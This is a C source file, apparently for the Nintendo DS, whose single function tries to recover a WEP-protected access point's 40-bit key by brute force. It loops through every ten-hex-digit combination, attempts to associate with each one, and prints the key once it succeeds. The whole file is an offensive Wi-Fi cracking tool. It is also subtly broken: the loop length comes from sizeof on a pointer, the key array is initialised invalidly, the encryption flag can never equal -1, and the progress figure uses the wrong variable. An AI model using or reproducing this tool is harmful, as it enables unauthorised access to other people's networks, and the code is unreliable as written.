#include "forceWifi.h"

unsigned char* Wifi_GetWepKey(Wifi_AccessPoint ap) {

	unsigned char* HEX = "0123456789ABCDEF";

	printf("Checking encryption...");
	unsigned char*key;
//default: no encryption
	u8 en = 0;
	if (ap.flags & WFLAG_APDATA_WEP)
		en = 1;
//incompatible
	if (ap.flags & WFLAG_APDATA_WPA)
		en = -1;
	if (en == 0) {
		printf("Encryption : NONE \n");
		return "[No key]";
	}
	if (en == -1) {
		printf("WPA Encryption isn't supported.\n");
		return "[Incompatible encryption]";
	}
	if (ap.flags & WFLAG_APDATA_COMPATIBLE)
		printf("AP is compatible! \n");
	printf("WEP encyption. \n Getting WEP mode... \n");
	printf("Press A to begin.");
	while (keysDown() & ~KEY_A) {
		scanKeys();
	}
	consoleClear();
	bool connected = false;
	int a, b, c, d, e, f, g, h, i, j, combs;
	combs = 0;
	const int len = sizeof(HEX);
	while (!connected) {
		for (a = 0; a < len; a++) {
			for (b = 0; b < len; b++) {
				for (c = 0; c < len; c++) {
					for (d = 0; d < len; d++) {
						for (e = 0; e < len; e++) {
							for (f = 0; f < len; f++) {
								for (g = 0; g < len; g++) {
									for (h = 0; h < len; h++) {
										for (i = 0; i < len; i++) {
											for (j = 0; j < len; j++) {
												unsigned char*key = { HEX[a],
														HEX[b], HEX[c], HEX[d],
														HEX[e], HEX[f], HEX[g],
														HEX[h], HEX[i], HEX[j] };
												consoleClear();
												printf(
														"Tried %i comdinations out of 1099511627776 possible. \n",
														combs);
												printf(
														"Forcing progress: %i  \n",
														100 * i
																/ 1099511627776);

												Wifi_ConnectAP(&ap,
														WEPMODE_40BIT, 0, key);
												printf("Associating...");
												do {

												} while (Wifi_AssocStatus()
														== ASSOCSTATUS_ASSOCIATING);
												if (Wifi_AssocStatus()
														== ASSOCSTATUS_ASSOCIATED) {
													printf(
															"Associated!\n key= \n");
													printf(
															"%s",
															unsignedToSignedArray(
																	key, 10));
													connected = true;
													return key;
												}
												Wifi_UpdateSpotByName(ap.ssid,
														&ap);
												if (ap.rssi == 0) {
													printf(
															"Connection lost. \n Try moving closer to the AP.");
													return key;
												}
												scanKeys();

												if (keysDown() & KEY_Y) {
													printf(
															"Forcing cancelled by user.");
													return key;
												}
												if (keysDown() & KEY_DOWN)
													wait(180);
												if (keysDown() & KEY_UP)
													printf("%s",key);
												combs++;
											}
										}
									}
								}
							}
						}
					}
				}
			}
		} //end of for-mess :)
	}/*end while*/
	consoleClear();
	return key;
}
